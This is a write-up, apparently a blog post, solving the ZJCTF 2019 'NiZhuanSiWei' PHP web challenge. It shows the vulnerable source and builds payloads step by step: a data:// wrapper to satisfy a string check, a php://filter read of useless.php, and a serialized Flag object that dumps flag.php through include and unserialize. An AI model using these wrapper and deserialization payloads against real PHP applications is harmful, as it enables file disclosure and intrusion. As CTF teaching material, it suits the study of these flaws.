---
title: ZJCTF 2019 NiZhuanSiWei
date: 2022-05-28 21:59:12
toc: false
tags:
- 反序列化
- PHP伪协议
categories: CTF-Web
my: ZJCTF-2019-NiZhuanSiWei
---

题目源码:

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

很明显的反序列化题目，需要get传参数`text,file,password`还需要进行一个绕过

`if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))`

首先这个text不能为空，在文件中读取字符串为`welcome to the zjctf`

此时就需要用到data://协议，构造payload

```
?text=data://text/plain,welcome to the zjctf
```

然后观察有一正则匹配，我们不能直接为flag.php，有一文件包含了`useless.php`我们利用php://filter协议读取源码

```
file=php://filter/read=convert.base64-encode/resource=useless.php
```

将二者结合拿到base64编码后的源码

```
text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php
```

![](https://nssctf.wdf.ink/img/xmj/image-20220528220808966.png)

在进行解码后

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
```

直接进行反序列化

```php
<?php 
class Flag{  //flag.php 
    public $file="flag.php"; 
    public function __tostring(){ 
        if(isset($this->file)){ 
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        } 
    } 
} 
$password=new Flag();
echo serialize($password);
?> 
```

![](https://nssctf.wdf.ink/img/xmj/image-20220528221026104.png)

最终我们的payload

```
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} 
```

![](https://nssctf.wdf.ink/img/xmj/image-20220528221443996.png)

右键查看源码找到flag

![](https://nssctf.wdf.ink/img/xmj/image-20220528221516224.png)
